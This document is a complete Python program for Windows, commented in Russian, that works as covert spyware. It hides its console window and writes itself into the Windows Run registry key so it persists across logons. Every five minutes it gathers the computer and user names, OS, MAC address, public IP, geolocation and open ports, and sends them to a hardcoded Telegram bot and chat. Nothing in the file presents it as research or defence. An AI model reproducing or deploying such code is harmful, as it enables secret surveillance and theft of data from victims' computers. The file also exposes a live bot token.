import os
import sys
import json
import ctypes
import socket
import struct
import winreg
import requests
import platform
import subprocess
from uuid import getnode
from threading import Timer

# ====== КОНФИГУРАЦИЯ ======
TELEGRAM_BOT_TOKEN = '7266701740:AAEBLCvcslTg1rEMuafNnwYU3XJNmuZtOuc'
TELEGRAM_CHAT_ID = '6114034375'
CHECK_INTERVAL = 300  # Интервал проверки в секундах (5 минут)
# ==========================

def hide_console():
    """Скрыть консольное окно"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def add_to_startup():
    """Добавить программу в автозагрузку Windows"""
    try:
        app_path = os.path.abspath(sys.argv[0])
        app_name = os.path.basename(app_path)
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE) as key:
            
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{app_path}"')
    except Exception:
        pass

def get_public_ip():
    """Получить публичный IP-адрес"""
    try:
        return requests.get('https://api.ipify.org').text
    except Exception:
        return "N/A"

def get_geolocation():
    """Получить геолокацию по IP"""
    try:
        response = requests.get('http://ip-api.com/json/').json()
        return {
            'IP': response.get('query', 'N/A'),
            'Country': response.get('country', 'N/A'),
            'Region': response.get('regionName', 'N/A'),
            'City': response.get('city', 'N/A'),
            'ZIP': response.get('zip', 'N/A'),
            'Lat': response.get('lat', 'N/A'),
            'Lon': response.get('lon', 'N/A'),
            'ISP': response.get('isp', 'N/A'),
            'ORG': response.get('org', 'N/A'),
            'AS': response.get('as', 'N/A')
        }
    except Exception:
        return None

def get_open_ports():
    """Получить открытые порты (только LISTENING)"""
    try:
        result = subprocess.run(
            ['netstat', '-ano'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        ports = set()
        for line in result.stdout.splitlines():
            if 'LISTENING' in line:
                parts = line.split()
                if len(parts) >= 2:
                    addr = parts[1]
                    if ':' in addr:
                        port = addr.split(':')[-1]
                        if port.isdigit():
                            ports.add(port)
        return sorted(ports, key=int)
    except Exception:
        return []

def get_system_info():
    """Собрать информацию о системе"""
    return {
        'Computer': platform.node(),
        'OS': f'{platform.system()} {platform.release()}',
        'Arch': platform.machine(),
        'User': os.getlogin(),
        'MAC': ':'.join(("%012X" % getnode())[i:i+2] for i in range(0, 12, 2))
    }

def send_telegram(message):
    """Отправить сообщение в Telegram"""
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

def collect_and_send():
    """Собрать данные и отправить в Telegram"""
    # Сбор информации
    geo = get_geolocation()
    ports = get_open_ports()
    system = get_system_info()
    public_ip = get_public_ip()
    
    # Формирование сообщения
    msg = "<b>🖥️ System Information</b>\n"
    msg += f"• Computer: {system['Computer']}\n"
    msg += f"• User: {system['User']}\n"
    msg += f"• OS: {system['OS']} ({system['Arch']})\n"
    msg += f"• MAC: {system['MAC']}\n\n"
    
    msg += "<b>🌐 Network Information</b>\n"
    msg += f"• Public IP: {public_ip}\n\n"
    
    if geo:
        msg += "<b>📍 Geolocation</b>\n"
        msg += f"• IP: {geo['IP']}\n"
        msg += f"• Location: {geo['City']}, {geo['Region']}, {geo['Country']}\n"
        msg += f"• ZIP: {geo['ZIP']}\n"
        msg += f"• Coordinates: {geo['Lat']}, {geo['Lon']}\n"
        msg += f"• ISP: {geo['ISP']}\n"
        msg += f"• Organization: {geo['ORG']}\n\n"
    
    msg += "<b>🔌 Open Ports</b>\n"
    msg += f"• Count: {len(ports)}\n"
    msg += f"• Ports: {', '.join(ports[:25])}"
    if len(ports) > 25:
        msg += f" +{len(ports)-25} more"
    
    # Отправка сообщения
    send_telegram(msg)
    
    # Планирование следующего запуска
    Timer(CHECK_INTERVAL, collect_and_send).start()

def main():
    # Скрыть консоль
    hide_console()
    
    # Добавить в автозагрузку
    add_to_startup()
    
    # Запустить сбор данных с интервалом
    collect_and_send()

if __name__ == '__main__':
    # Проверка дубликатов процесса
    if getattr(sys, 'frozen', False):
        app_path = os.path.dirname(sys.executable)
    else:
        app_path = os.path.dirname(os.path.abspath(__file__))
    
    lock_file = os.path.join(app_path, '~system_report.lock')
    
    try:
        if os.path.exists(lock_file):
            sys.exit(0)
        open(lock_file, 'w').close()
        main()
    except Exception:
        pass
